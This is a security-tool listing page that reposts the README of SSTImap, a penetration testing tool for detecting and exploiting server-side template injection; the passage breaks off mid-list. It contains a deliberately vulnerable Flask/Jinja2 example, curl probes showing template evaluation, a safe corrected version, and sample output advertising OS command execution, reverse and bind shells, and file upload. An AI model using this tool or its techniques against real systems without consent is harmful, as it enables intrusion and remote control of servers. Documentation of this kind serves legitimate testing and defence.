---
title: SSTImap v1.4
url: https://kitploit.com/en/posts/github-vladko312-sstimap-v14
source: Kitploit
date: 2026-08-26
fetch_date: 2026-08-27T12:12:40.568695
---

# SSTImap v1.4

[Skip to content](#main-content)

[![Kitploit](/_next/image?url=%2Flogo.png&w=64&q=75)KITPLOIT](/en)[Tools](/en/tools)[Blog](/en/blog)Categories

EN

[Submit](/en/submit)

[Tools](/en/tools)[Blog](/en/blog)Categories

[Submit](/en/submit)

EN

Hacking, PenTest, and Cybersecurity Tools for Your Security Arsenal!

[Back to updates](/en/updates)

![](https://assets.kitploit.com/production/public/tools/17/301913ade1b3fe73a17eff5da71758d1c6e7e6607cd965f024d7d53206d873ec.png)

New releaseAug 26, 2026

# SSTImap v1.4

Automatic SSTI detection tool with interactive interface

Share

# SSTImap

[![Version 1.3](https://img.shields.io/badge/version-1.3-green.svg?logo=github)](https://github.com/vladko312/sstimap)
[![Python 3.14](https://img.shields.io/badge/python-3.14-blue.svg?logo=python)](https://www.python.org/downloads/release/python-3140/)
[![Python 3.6](https://img.shields.io/badge/python-3.6+-yellow.svg?logo=python)](https://www.python.org/downloads/release/python-360/)
[![GitHub](https://img.shields.io/github/license/vladko312/sstimap?color=green&logo=gnu)](https://www.gnu.org/licenses/gpl-3.0.txt)
[![GitHub last commit](https://img.shields.io/github/last-commit/vladko312/sstimap?color=green&logo=github)](https://github.com/vladko312/sstimap/commits/)
[![Maintenance](https://img.shields.io/maintenance/yes/2026?logo=github)](https://github.com/vladko312/sstimap)

> This project is based on [Tplmap](https://github.com/epinna/tplmap/).

SSTImap is a penetration testing software that can check websites for Code Injection and Server-Side Template Injection vulnerabilities and exploit them, giving access to the operating system itself.

This tool was developed to be used as an interactive penetration testing tool for SSTI detection and exploitation, which allows more advanced exploitation. More payloads for SSTImap can be found [here](https://github.com/vladko312/extras).

Payloads and techniques came from:

* James Kettle's [Server-Side Template Injection: RCE For The Modern Web App](http://blog.portswigger.net/2015/08/server-side-template-injection.html)
* Other public researches [[1]](https://artsploit.blogspot.co.uk/2016/08/pprce2.html) [[2]](https://opsecx.com/index.php/2016/07/03/server-side-template-injection-in-tornado/) [[8]](https://gist.github.com/n1nj4sec/5e3fffdfa322f4c23053359fc8100ab9)
* Contributions to Tplmap [[3]](https://github.com/epinna/tplmap/issues/9) [[4]](http://disse.cting.org/2016/08/02/2016-08-02-sandbox-break-out-nunjucks-template-engine)
* My own research [[9]](https://github.com/vladko312/Research_Successful_Errors)

This tool is capable of exploiting some code context escapes and blind injection scenarios. It also supports *eval()*-like code injections in Java, JavaScript, PHP, Python, Ruby and generic unsandboxed template engines.

## Key differences with Tplmap

Even though this software is based on Tplmap's code, backwards compatibility is not provided.

* Added two new techniques for SSTI detection and exploitation
* Interactive mode (`-i`) allowing for easier exploitation and detection
* Simple evaluation payloads as response markers in case of payload reflection
* Added new payloads for generic templates, to test all contexts use `--generic`
* Generic evaluating template injection detection using `Eval_generic` module
* Base language *eval()*-like shell (`-x`) or single command (`-X`) execution
* Blind file upload now supports MD5 confirmation and file existence check
* Added new payloads for more templates and updated many existing payloads
* Modular plugin structure that allows additional plugin installation
* Support for different POST data types
* Added crawling and form detection
* Short versions added to many arguments
* Some old command line arguments were changed, check `-h` for help
* Code is changed to use newer python features
* Burp Suite extension temporarily removed, as *Jython* doesn't support Python3

## Server-Side Template Injection

This is an example of a simple website written in Python using [Flask](http://flask.pocoo.org/) framework and [Jinja2](http://jinja.pocoo.org/) template engine. It integrates user-supplied variable `name` in an unsafe way, as it is concatenated to the template string before rendering.

root@kitploit:~

```
from flask import Flask, request, render_template_string
import os

app = Flask(__name__)

@app.route("/page")
def page():
    name = request.args.get('name', 'World')
    # SSTI VULNERABILITY:
    template = f"Hello, {name}!<br>\n" \
                "OS type: {{os}}"
    return render_template_string(template, os=os.name)

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=80)
```

Not only this way of using templates creates XSS vulnerability, but it also allows the attacker to inject template code, that will be executed on the server, leading to SSTI.

root@kitploit:~

```
$ curl -g 'https://www.target.com/page?name=John'
Hello John!<br>
OS type: posix
$ curl -g 'https://www.target.com/page?name={{7*7}}'
Hello 49!<br>
OS type: posix
```

User-supplied input should be introduced in a safe way through rendering context:

root@kitploit:~

```
from flask import Flask, request, render_template_string
import os

app = Flask(__name__)

@app.route("/page")
def page():
    name = request.args.get('name', 'World')
    template = "Hello, {{name}}!<br>\n" \
               "OS type: {{os}}"
    return render_template_string(template, name=name, os=os.name)

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=80)
```

## Predetermined mode

SSTImap in predetermined mode is very similar to Tplmap. It is capable of detecting and exploiting SSTI vulnerabilities in multiple different templates.

After the exploitation, SSTImap can provide access to code evaluation, OS command execution and file system manipulations.

To check the URL, you can use `-u` argument:

root@kitploit:~

```
$ ./sstimap.py -u https://example.com/page?name=John

    ╔══════╦══════╦═══════╗ ▀█▀
    ║ ╔════╣ ╔════╩══╗ ╔══╝═╗▀╔═
    ║ ╚════╣ ╚════╗  ║ ║    ║{║ _ __ ___   __ _ _ __
    ╚════╗ ╠════╗ ║  ║ ║    ║*║ | '_ ` _ \ / _` | '_ \
    ╔════╝ ╠════╝ ║  ║ ║    ║}║ | | | | | | (_| | |_) |
    ╚══════╩══════╝  ╚═╝    ╚╦╝ |_| |_| |_|\__,_| .__/
                             │                  | |
                                                |_|
[*] Version: 1.3.0
[*] Author: @vladko312
[*] Based on Tplmap
[!] LEGAL DISCLAIMER: Usage of SSTImap for attacking targets without prior mutual consent is illegal.
It is the end user's responsibility to obey all applicable local, state and federal laws.
Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] Testing if GET parameter 'name' is injectable
[*] Smarty plugin is testing rendering with tag '*'
...
[*] Jinja2 plugin is testing rendering with tag '{{*}}'
[+] Jinja2 plugin has confirmed injection with tag '{{*}}'
[+] SSTImap identified the following injection point:

  GET parameter: name
  Engine: Jinja2
  Injection: {{*}}
  Context: text
  OS: posix-linux
  Technique: render
  Capabilities:

    Shell command execution: ok
    Bind and reverse shell: ok
    File write: ok
    File read: ok
    Code evaluation: ok, python code

[+] Rerun SSTImap providing one of the following options:
    --os-shell                   Prompt for an interactive operating system shell
    --os-cmd                     Execute an operating system command.
    --eval-shell                 Prompt for an interactive shell on the template engine base language.
    --eval-cmd                   Evaluate code in the template engine base language.
    --tpl-shell                  Prompt for an interactive shell on the template engine.
    --tpl-cmd                    Inject code in the template engine.
    --bind-shell PORT            Connect to a shell bind to a target port
    --reverse-shell HOST PORT    Send a shell back to the attacker's port
    --upload LOCAL REMOTE        Upload files to the server
    --download REMO...